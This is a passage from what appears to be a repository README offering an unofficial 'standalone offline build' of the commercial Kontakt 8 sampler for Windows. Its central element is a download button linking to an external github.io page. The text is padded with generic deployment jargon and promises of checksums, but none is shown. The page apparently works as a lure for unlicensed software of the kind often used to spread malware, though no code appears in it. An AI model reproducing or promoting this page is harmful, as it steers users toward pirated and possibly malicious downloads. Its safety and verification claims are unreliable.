<div align="center">

# 🎧 Kontakt 8 2026: Standalone Offline Build for Windows 11

<img src="https://img.shields.io/badge/platform-windows_10%2F11-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Platform"> <img src="https://img.shields.io/badge/release-v2026.1-24292F?style=for-the-badge" alt="Release"> <img src="https://img.shields.io/badge/updated-2026--11--14-6E7781?style=for-the-badge" alt="Updated"> <img src="https://img.shields.io/badge/status-stable-2EA043?style=for-the-badge" alt="Status"> <img src="https://img.shields.io/badge/languages-12%2B-8250DF?style=for-the-badge&logo=googletranslate&logoColor=white" alt="Languages">

</div>

## 📦 Intro

This repository packages a standalone offline Windows x64 distribution intended for the Kontakt 8 workflow on Windows 10 and 11. The distribution ships as a self-contained setup that unpacks the sampler engine, bundled libraries, and host integration files into a per-user program directory without pulling dependencies from the network at runtime. It is maintained as a reproducible deployment bundle for technicians who need a known-good installer artifact rather than a vendor-mediated delivery channel.

The build is aimed at workstation deployments where network access is restricted, bandwidth is scarce, or installs must be reproducible across a fleet of machines. Offline deployment matters because the installer can be staged on removable media, hashed, and verified before it ever touches the target host. That makes provisioning predictable: the same package yields the same on-disk layout on every Windows machine.

A single Kontakt 8 on Windows deployment covers both portable and installed modes, and the packaged runtime includes the VST3 and standalone host binaries alongside the factory content manifest. Format support spans common sampler and audio container types, and the deployment surface stays confined to the per-user program directory and the user profile.

## 01 · ⬇️ Download

<p align="center">
  <a href="https://ben-cook-42.github.io/kontakt-8-desktop/">
    <picture>
      <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
      <img src="docs/buttons/installer-card.svg" alt="" width="440">
    </picture>
  </a>
</p>

<p align="center">
  <img src="docs/buttons/banner.png" alt="Kontakt 8 2026 standalone build running on Windows 11, interface banner" width="100%">
</p>

## 02 · ✨ Features

<table>
<tr>
<td width="33%" valign="top">

**🧩 Self-Contained Package**

Ships the runtime, factory content manifest, and host binaries in one offline bundle.

</td>
<td width="33%" valign="top">

**📴 Offline Initialization**

First run completes without network calls, so installs work on air-gapped workstations.

</td>
<td width="33%" valign="top">

**🔐 SHA256 Manifest**

Each release publishes a checksum so the artifact can be verified before deployment.

</td>
</tr>
<tr>
<td valign="top">

**💾 Portable Mode**

Runs from a removable path without writing to system directories when selected.

</td>
<td valign="top">

**🧱 Reproducible Layout**

Consistent program and profile paths across machines make fleet provisioning predictable.

</td>
<td valign="top">

**🔌 Host Integration**

Registers VST3 and standalone host entries through the per-user shell on request.

</td>
</tr>
</table>

## 03 · ⚙️ How it works

The installer extracts the engine binaries, factory content manifest, and host integration files into the per-user program directory by default, with an opt-in system-wide path during setup. Configuration and user presets live under the user profile, keeping the install scoped to the current account. Nothing is written to Windows system directories.

On first launch the build registers its host entries with the Windows shell for the current user, writes a default configuration file to the profile path, and indexes factory content. The first run also probes the audio subsystem and records the detected driver stack in the config so subsequent launches skip detection.

Day to day, the build runs entirely from local files and needs no network connection once installed. Updates ship as a newer versioned installer; running it over the existing install preserves projects, presets, and preferences. No background updater service is installed or scheduled.

The integration surface is limited to the per-user registry hive, shell file associations (optional), and the VST3 discovery path. External dependencies are the standard Windows runtime and the audio driver stack already present on the host. Coexistence with other installations is handled by versioned program directories.

## 04 · 🧩 Compatibility

The build targets Windows 10 and Windows 11 on x64 only, across Home, Pro, and Enterprise editions. It runs on current servicing builds of both releases; very old feature updates are not validated. 32-bit Windows targets are not supported.

PowerShell 5.1 and later are supported for the optional install and verification